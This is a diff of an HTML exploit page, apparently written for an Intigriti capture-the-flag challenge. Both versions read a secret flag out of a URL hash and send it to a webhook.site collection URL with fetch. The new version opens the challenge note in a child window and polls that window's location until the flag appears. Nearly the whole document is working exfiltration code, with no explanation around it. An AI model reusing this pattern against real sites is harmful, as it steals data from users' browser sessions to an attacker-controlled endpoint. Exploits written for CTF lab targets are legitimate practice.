@@ -1,13 +1,20 @@
+
 <!DOCTYPE html>
-<html>
-<body>
+<html><body>
 <script>
-  // Se c’è un hash nel formato #:~:username:FLAG
-  if (window.location.hash.startsWith('#:')) {
-    const secret = window.location.hash.slice(2);
-    const flag = secret.split(':')[1];
-    fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag='+encodeURIComponent(flag));
-  }
+(async () => {
+  const child = window.open('https://challenge-0325.intigriti.io/note/7f0b3267-a3af-4bba-b9ab-cdbd52242636');
+  const interval = setInterval(() => {
+    try {
+      const hash = child.location.hash;
+      if (hash.startsWith('#:')) {
+        clearInterval(interval);
+        const flag = hash.slice(3).split(':')[1];
+        fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' + encodeURIComponent(flag));
+        child.close();
+      }
+    } catch {}
+  }, 500);
+})();
 </script>
-</body>
-</html>
+</body></html>
